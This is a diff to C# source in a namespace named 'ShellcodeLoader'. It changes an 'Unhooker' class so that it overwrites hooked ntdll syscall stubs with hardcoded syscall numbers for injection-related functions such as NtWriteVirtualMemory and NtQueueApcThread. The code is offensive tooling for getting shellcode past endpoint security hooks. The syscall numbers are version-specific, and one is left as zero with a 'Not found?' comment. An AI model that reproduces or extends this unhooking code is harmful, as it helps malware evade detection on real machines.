@@ -25,27 +25,27 @@ namespace ShellcodeLoader
     }
     partial class Unhooker
     {
-        static string[] functions =
+        static Dictionary<string, byte[]> functions = new Dictionary<string, byte[]>
         {
-            "NtClose",
-            "NtAllocateVirtualMemory",
-            "NtAllocateVirtualMemoryEx",
-            "NtCreateThread",
-            "NtCreateThreadEx",
-            "NtCreateUserProcess",
-            "NtFreeVirtualMemory",
-            "NtLoadDriver",
-            "NtMapViewOfSection",
-            "NtOpenProcess",
-            "NtProtectVirtualMemory",
-            "NtQueueApcThread",
-            "NtQueueApcThreadEx",
-            "NtResumeThread",
-            "NtSetContextThread",
-            "NtSetInformationProcess",
-            "NtSuspendThread",
-            "NtUnloadDriver",
-            "NtWriteVirtualMemory"
+            { "NtClose", new byte[]{0x0F, 0x00} },
+            { "NtAllocateVirtualMemory", new byte[]{0x18, 0x00} },
+            { "NtAllocateVirtualMemoryEx", new byte[]{0x00, 0x00} }, // Not found?
+            { "NtCreateThread", new byte[]{ 0x4E, 0x00} },
+            { "NtCreateThreadEx", new byte[]{0xB6, 0x00} },
+            { "NtCreateUserProcess", new byte[]{ 0xBD, 0x00} },
+            { "NtFreeVirtualMemory", new byte[]{0x1E, 0x00} },
+            { "NtLoadDriver", new byte[]{0xF9, 0x00} },
+            { "NtMapViewOfSection", new byte[]{0x28, 0x00} },
+            { "NtOpenProcess", new byte[]{0x26, 0x00} },
+            { "NtProtectVirtualMemory", new byte[]{0x50, 0x00} },
+            { "NtQueueApcThread", new byte[]{0x45, 0x00} },
+            { "NtQueueApcThreadEx", new byte[]{0x52, 0x01} },
+            { "NtResumeThread", new byte[]{0x52, 0x00} },
+            { "NtSetContextThread", new byte[]{0x78, 0x01} },
+            { "NtSetInformationProcess", new byte[]{0x1C, 0x00} },
+            { "NtSuspendThread", new byte[]{0xA9, 0x01} },
+            { "NtUnloadDriver", new byte[]{0xB2, 0x01} },
+            { "NtWriteVirtualMemory", new byte[]{0x3A, 0x00} }
         };
         static byte[] safeBytes = {
             0x4c, 0x8b, 0xd1, // mov r10, rcx
@@ -96,6 +96,9 @@ namespace ShellcodeLoader
                 {
                     ptr[i] = safeBytes[i];
                 }
+                Console.Write(" ==> Writing Specific Bytes");
+                ptr[4] = functions[func.Key][0];
+                ptr[5] = functions[func.Key][1];
                 Console.Write(" ==> Restoring memory protection");
                 Imports.NtProtectVirtualMemory(
                     proc.Handle,
@@ -128,7 +131,7 @@ namespace ShellcodeLoader
             else { Console.WriteLine("NTDLL Base Address: 0x{0:X}", ntdllBase.ToInt64()); }
 
             // Get the address of each of the target functions in ntdll.dll
-            IDictionary<string, IntPtr> funcAddresses = GetFuncAddress(ntdllBase, functions);
+            IDictionary<string, IntPtr> funcAddresses = GetFuncAddress(ntdllBase, functions.Keys.ToArray());
             Process proc = Process.GetCurrentProcess();
             // Check the first DWORD at each function's address for proper SYSCALL setup
             Console.WriteLine("==============================================================");
